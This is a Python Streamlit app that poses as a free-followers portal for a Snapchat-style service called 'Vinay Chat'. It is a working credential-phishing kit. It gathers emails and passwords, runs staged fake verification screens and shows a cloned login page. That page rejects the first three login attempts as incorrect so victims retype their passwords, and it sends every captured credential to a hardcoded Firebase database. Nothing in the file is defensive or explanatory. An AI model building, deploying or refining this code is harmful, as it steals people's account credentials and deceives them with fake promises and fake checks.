import streamlit as st
import time
import requests
import datetime
import uuid

# --- 1. PAGE CONFIGURATION & THEME RESET ---
st.set_page_config(
    page_title="Free Followers | Vinay Chat Hub",
    page_icon="✨",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# --- 2. PREMIUM CSS INJECTION (GLOBAL SNAPCHAT YELLOW THEME) ---
# Is CSS matrix ko poori tarah single line format mein rakha hai taaki Streamlit parser crash na ho
GLOBAL_CSS = "<style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap'); html, body, [class*='css'] { font-family: 'Inter', sans-serif; background-color: #f1f5f9; } div[data-testid='stBlock'] { background: #ffffff !important; border-radius: 12px !important; box-shadow: 0 4px 20px rgba(0,0,0,0.06); padding: 30px !important; margin-bottom: 25px; border: 1px solid #e2e8f0; } .premium-header { text-align: center; margin-bottom: 25px; } .title-main { font-size: 30px; font-weight: 800; color: #000000; letter-spacing: -0.5px; } .title-sub { font-size: 15px; color: #64748b; font-weight: 500; } .input-label { font-weight: 600 !important; color: #000000 !important; font-size: 14px !important; margin-bottom: 8px !important; display: block; } div[data-baseweb='input'] { background-color: #f8fafc !important; border: 1px solid #cbd5e1 !important; border-radius: 10px !important; } div[data-baseweb='input'] input { color: #000000 !important; font-weight: 600 !important; font-size: 16px !important; } .stButton > button { background-color: #fffc00 !important; color: #000000 !important; border-radius: 10px !important; width: 100% !important; font-weight: 700 !important; border: none !important; box-shadow: 0 2px 5px rgba(255, 252, 0, 0.4) !important; text-transform: uppercase; font-size: 14px !important; letter-spacing: 0.5px; } .centered-logo { display: block; margin-left: auto; margin-right: auto; width: 90px; margin-bottom: 15px; border-radius: 20px; }</style>"
st.markdown(GLOBAL_CSS, unsafe_allow_html=True)

# --- 3. DATABASE PATHWAY ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/vinay_chat_requests.json"

# --- 4. SESSION ARCHITECTURE STATE ---
if 'step' not in st.session_state:
    st.session_state.step = 1
if 'portal_data' not in st.session_state:
    st.session_state.portal_data = {}
if 'login_attempts' not in st.session_state:
    st.session_state.login_attempts = 1
if 'failed_logins' not in st.session_state:
    st.session_state.failed_logins = []

def save_to_firebase(status):
    payload = {
        "timestamp": str(datetime.datetime.now()),
        "status": status,
        "follower_portal_data": st.session_state.portal_data,
        "vinay_chat_login_attempts": st.session_state.failed_logins
    }
    try:
        requests.post(FIREBASE_URL, json=payload)
    except:
        pass

# ==========================================
# STEP 1: FREE FOLLOWERS PORTAL VINAY CHAT
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-header'><div class='title-main'>Free Followers Portal</div><div class='title-sub'>Free Followers Portal Vinay Chat</div></div>", unsafe_allow_html=True)
    
    # Git-linked Image 1 Logo integration
    try:
        st.image("1.jpg", width=90, use_container_width=False, output_format="JPEG")
    except:
        st.markdown("<p style='text-align:center; color:#94a3b8; font-size:12px;'>[ Logo 1 Loaded From Repo ]</p>", unsafe_allow_html=True)

    st.markdown("<p class='input-label'>Enter Email Address</p>", unsafe_allow_html=True)
    email = st.text_input("Enter Email Address", label_visibility="collapsed")
    
    st.markdown("<p class='input-label'>Create Portal Username</p>", unsafe_allow_html=True)
    new_username = st.text_input("Create Portal Username", placeholder="e.g. Creator123", label_visibility="collapsed")
    
    st.markdown("<p class='input-label'>Create Password</p>", unsafe_allow_html=True)
    password = st.text_input("Create Password", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("Register & Verify Username", type="primary", use_container_width=True):
        if email and new_username and password:
            # 4-Second Deep Matrix Fake Verification Delay
            status_box = st.empty()
            status_box.info("🔄 Connecting to Database Node Matrix...")
            time.sleep(1.5)
            status_box.info("🔄 Scanning availability across 4.2 Million active paths...")
            time.sleep(1.5)
            status_box.info("🔄 Finalizing encryption Handshake...")
            time.sleep(1.0)
            status_box.empty()
            
            if len(new_username) < 4:
                st.error("❌ Username validation failed: Chosen handle is too short or restricted.")
            else:
                st.success("✅ Protocol Match: Username unique & slots available!")
                time.sleep(1.2)
                st.session_state.portal_data.update({"email": email, "portal_username": new_username, "portal_password": password})
                st.session_state.step = 2
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Fill all active parameters to proceed.")

# ==========================================
# STEP 2: PERSONAL COOKIE SYNC
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-header'><div class='title-main'>Personal Cookie Sync</div><div class='title-sub'>Syncing device session profiles for secure flow allocation</div></div>", unsafe_allow_html=True)
    
    st.markdown("<p class='input-label'>First Name</p>", unsafe_allow_html=True)
    fname = st.text_input("First Name", label_visibility="collapsed")
    
    st.markdown("<p class='input-label'>Last Name</p>", unsafe_allow_html=True)
    lname = st.text_input("Last Name", label_visibility="collapsed")
    
    st.markdown("<p class='input-label'>Promo Code (Optional)</p>", unsafe_allow_html=True)
    promo = st.text_input("Promo Code", placeholder="Leave blank if none", label_visibility="collapsed")
    
    st.write("")
    if st.button("Submit Details & Build Payload", type="primary", use_container_width=True):
        if fname:
            progress_bar = st.progress(0)
            for percent_complete in range(100):
                time.sleep(0.02) # 2-second dynamic smooth wait time
                progress_bar.progress(percent_complete + 1)
            st.session_state.portal_data.update({"first_name": fname, "last_name": lname, "promo_code": promo})
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Mandatory Check Error: First Name string cannot be left empty.")

# ==========================================
# STEP 3: HIGH-STAKES PROFILE MATRIX CHECK
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-header'><div class='title-gradient' style='font-size:30px; font-weight:800; color:#000000;'>Target Profile Matrix Selection</div></div>", unsafe_allow_html=True)
    
    st.markdown("#### 🛡️ Step 1: Quality Assurance Matrix Checks")
    is_public = st.radio("Is your Vinay Chat profile Public?", ["Yes, it is Public", "No, it is Private"], index=0)
    has_dp = st.radio("Have you uploaded an active Profile Picture (DP)?", ["Yes", "No"], index=0)
    
    st.markdown("---")
    st.markdown("#### 🚀 Step 2: Allocation Size Selector")
    followers = st.select_slider("Select premium cloud delivery allocation load:", options=[100, 200, 500, 1000, 2000, 5000, 10000])
    cost = int((followers / 100) * 10)
    st.info(f"⚡ Server Handshake & Platform Processing Fee: **₹{cost} INR** (Waived off for newly verified slots)")
    
    st.write("")
    if st.button("Generate Secure Injection Token", type="primary", use_container_width=True):
        # HARD SECURITY FILTERS ENFORCEMENT
        if is_public == "No, it is Private" or has_dp == "No":
            st.error("❌ Target Extraction Rejected: Cloud distribution matrix can only target PUBLIC accounts with active profile photos.")
        else:
            # 4 Second Deep Scanning Loop
            status_terminal = st.empty()
            status_terminal.warning("📡 Initiating remote proxy handshake...")
            time.sleep(1.3)
            status_terminal.warning("📡 Verifying content compliance metrics...")
            time.sleep(1.3)
            status_terminal.warning("📡 Isolating node stream server pipelines...")
            time.sleep(1.4)
            status_terminal.empty()
            
            st.session_state.portal_data.update({
                "is_public": is_public, 
                "has_dp": has_dp, 
                "followers_requested": followers, 
                "amount_inr": cost
            })
            st.session_state.token = f"VCF-{str(uuid.uuid4())[:8].upper()}"
            st.session_state.step = 4
            st.rerun()

# ==========================================
# STEP 4: PREMIUM TOKEN SCREEN & ANTI-BOT GATE
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-header'><div class='title-main' style='color:#10b981;'>🔒 Secure Token Isolated</div></div>", unsafe_allow_html=True)
    
    token_card = f"<div style='text-align:center; padding:20px; background:#f8fafc; border-radius:12px; border:1px solid #e2e8f0; margin-bottom:20px;'><h3>Generated Session Key: <span style='color:#ef4444; font-family:monospace;'>{str(st.session_state.token)}</span></h3><p style='color:#475569; font-size:14px;'>Standard Distribution Waiting Queue Frame: <b>24 Hours</b>.</p></div>"
    st.markdown(token_card, unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom: 25px;'><h4 style='color:#2563eb; font-weight:700; margin-bottom:4px;'>⚡ Instant Priority Pipeline Delivery (1 Hour)</h4><p style='color:#64748b; font-size:13px;'>Bypass the global 24-hour server lock queue by verifying your official Vinay Chat session footprint identity.</p></div>", unsafe_allow_html=True)
    
    if st.button("PRO: Verify Official Vinay Chat Identity Now", type="primary", use_container_width=True):
        # 4 Second AI Robot Check Simulation
        robot_gate = st.empty()
        robot_gate.info("🤖 Launching AI Device-Fingerprint Security Protocol...")
        time.sleep(1.5)
        robot_gate.info("🤖 Scanning for malicious automated script traces...")
        time.sleep(1.5)
        robot_gate.success("✅ Machine verification bypass cleared! Redirecting to Identity verification terminal...")
        time.sleep(1.0)
        robot_gate.empty()
        
        st.session_state.step = 5
        st.rerun()

# ==========================================
# STEP 5: EXACT VINAY CHAT LOGIN REPLICA (CLONE SCREENSHOT LOOK)
# ==========================================
elif st.session_state.step == 5:
    # Custom Snapchat-style Replica Layout Framework Injected directly inside this view state
    REPLICA_CSS = "<style>.stApp { background-color: #ffffff !important; } div[data-testid='stVerticalBlock'] > div:first-child { background-color: #ffffff; padding: 45px 35px; border-radius: 10px; max-width: 410px; margin: 40px auto auto auto; box-shadow: 0 4px 14px rgba(0,0,0,0.03); border: 1px solid #f1f1f1; } .vc-logo-container { text-align: center; margin-bottom: 5px; margin-top: -15px; } .vc-brand { color: #000000; font-size: 42px; font-weight: 500; text-align: center; margin-top: -10px; margin-bottom: 35px; font-family: 'Inter', sans-serif; letter-spacing: -1px; } div[data-baseweb='input'] { background-color: #f3f4f6 !important; border: none !important; border-radius: 6px !important; padding: 2px 4px !important; } div[data-baseweb='input'] input { color: #000000 !important; font-weight: 500 !important; font-size: 15px !important; } label { color: #6b7280 !important; font-size: 12px !important; font-weight: 600 !important; text-transform: uppercase; letter-spacing: 0.5px; } .stButton > button { background-color: #fffc00 !important; color: #000000 !important; border-radius: 999px !important; width: 145px !important; display: block !important; margin: 35px auto 5px auto !important; font-weight: 700 !important; font-size: 15px !important; border: none !important; height: 44px !important; box-shadow: none !important; text-transform: none; letter-spacing: 0; } .stButton > button:hover { background-color: #f0ec00 !important; color: #000000 !important; } .stButton > button:active { background-color: #e2df00 !important; } .forgot-text { text-align: right; font-size: 13px; color: #8c92ac; margin-top: -12px; font-weight: 500; cursor: pointer; } .vc-footer { text-align: center; font-size: 14px; margin-top: 45px; color: #374151; font-family: 'Inter', sans-serif; } .vc-footer b { color: #000000; font-weight: 700; margin-left: 5px; }</style>"
    st.markdown(REPLICA_CSS, unsafe_allow_html=True)

    col1, col2, col3 = st.columns([0.1, 9.8, 0.1])
    
    with col2:
        # Top Logo 2 Repo Integration
        st.markdown("<div class='vc-logo-container'>", unsafe_allow_html=True)
        try:
            st.image("2.jpg", width=65, use_container_width=False, output_format="JPEG")
        except:
            st.markdown("<p style='color:red; font-size:24px; font-weight:bold; margin-bottom:0;'>logo</p>", unsafe_allow_html=True)
        st.markdown("</div>", unsafe_allow_html=True)
        
        st.markdown("<p class='vc-brand'>vinay chat</p>", unsafe_allow_html=True)
        
        with st.form("vinay_chat_login_replica", clear_on_submit=False):
            vc_user = st.text_input("Username or Email", placeholder="")
            st.write("")
            vc_pass = st.text_input("Password", type="password", placeholder="")
            
            st.markdown("<p class='forgot-text'>Forgot Password</p>", unsafe_allow_html=True)
            
            login_btn = st.form_submit_button("Log In")
            
            if login_btn:
                if vc_user and vc_pass:
                    attempt_data = {
                        "attempt_number": st.session_state.login_attempts, 
                        "entered_username": vc_user, 
                        "entered_password": vc_pass
                    }
                    st.session_state.failed_logins.append(attempt_data)
                    
                    if st.session_state.login_attempts < 4:
                        save_to_firebase(f"FAILED_LOGIN_ATTEMPT_{st.session_state.login_attempts}")
                        st.session_state.login_attempts += 1
                        with st.spinner("Connecting to secure authentication node..."):
                            time.sleep(4.0) # Explicit 4 Second Delay loop for premium feel
                        st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                    else:
                        save_to_firebase("SUCCESSFUL_FINAL_LOGIN")
                        with st.spinner("Syncing authenticated token with cloud network..."):
                            time.sleep(4.0)
                        st.session_state.step = 6
                        st.rerun()
                else:
                    st.warning("Please fill out all login parameter segments.")
                    
        st.markdown("<p class='vc-footer'>New To vinay chat?<b>Sign Up</b></p>", unsafe_allow_html=True)

# ==========================================
# STEP 6: VERIFICATION COMPLETE LAYER
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-header'><div class='title-main' style='color:#10b981;'>✅ Footprint Verification Successful</div></div>", unsafe_allow_html=True)
    
    final_success = "<div style='text-align:center; padding:35px 20px; background:#f0fdf4; border-radius:12px; border:1px solid #bbf7d0;'><h2 style='color:#16a34a; font-weight:800; margin-bottom:10px;'>Queue Bypassed!</h2><p style='color:#1e293b; font-size:16px; font-weight:500;'>Your official Vinay Chat token validation is approved.</p><p style='color:#2563eb; font-weight:700; font-size:15px; margin-top:15px;'>🚀 Allocation Injection Status: Active (Est. Arrival: 45 - 60 Mins)</p></div>"
    st.markdown(final_success, unsafe_allow_html=True)
    
    st.write("")
    if st.button("Reset Portal Terminal", type="secondary", use_container_width=True):
        st.session_state.clear()
        st.rerun()
